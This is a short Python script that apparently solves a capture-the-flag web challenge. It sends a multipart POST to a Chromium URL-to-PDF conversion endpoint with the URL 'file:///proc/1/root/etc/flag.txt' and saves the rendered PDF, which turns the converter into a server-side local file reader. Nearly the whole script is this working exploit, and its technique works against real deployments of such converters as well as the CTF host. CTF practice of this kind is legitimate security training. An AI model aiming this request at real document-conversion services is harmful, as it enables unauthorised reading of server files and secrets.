import logging
import requests

# Enable logging at the DEBUG level
logging.basicConfig(level=logging.DEBUG)

# Configure the requests library to use the logging settings
logging.getLogger("requests.packages.urllib3").setLevel(logging.DEBUG)
logging.getLogger("requests.packages.urllib3").propagate = True

url = "https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/forms/chromium/convert/url"

headers = {
    "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Dnt": "1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=0, i"
}

import requests

# Define the URL and form data
form_data = {
    "url": (None, "file:///proc/1/root/etc/flag.txt")
}

# Make the POST request and save the response
response = requests.post(url, files=form_data)

# Check the response status code
if response.status_code == 200:
    # Save the PDF content to a file
    pdf_filename = 'my.pdf'
    with open(pdf_filename, 'wb') as pdf_file:
        pdf_file.write(response.content)
    print(f"PDF saved successfully as {pdf_filename}")
else:
    print("Failed to receive PDF")
    print("Response Status Code:", response.status_code)
    print("Response Headers:", response.headers)
    print("Response Text:", response.text)

# Print request details for debugging
print("Request URL:", response.request.url)
print("Request Headers:", response.request.headers)
print("Request Body:", response.request.body)
